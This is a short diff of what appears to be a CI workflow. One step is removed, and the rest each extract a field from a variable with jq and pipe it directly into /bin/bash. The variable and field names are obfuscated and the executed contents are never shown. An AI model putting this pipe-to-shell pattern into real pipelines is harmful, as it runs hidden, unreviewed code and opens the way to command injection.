@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$cotj4066" | jq -r .vn758 | /bin/bash
           echo $feqpf6436 | jq -r .z370 | /bin/bash
           printf '%s' "$fq6" | jq -r .qj2 | /bin/bash
-          echo $lr424 | jq -r .cewz2348 | /bin/bash
           printf '%s' "$svrcu941" | jq -r .esv4649 | /bin/bash
 
       - name: Save results
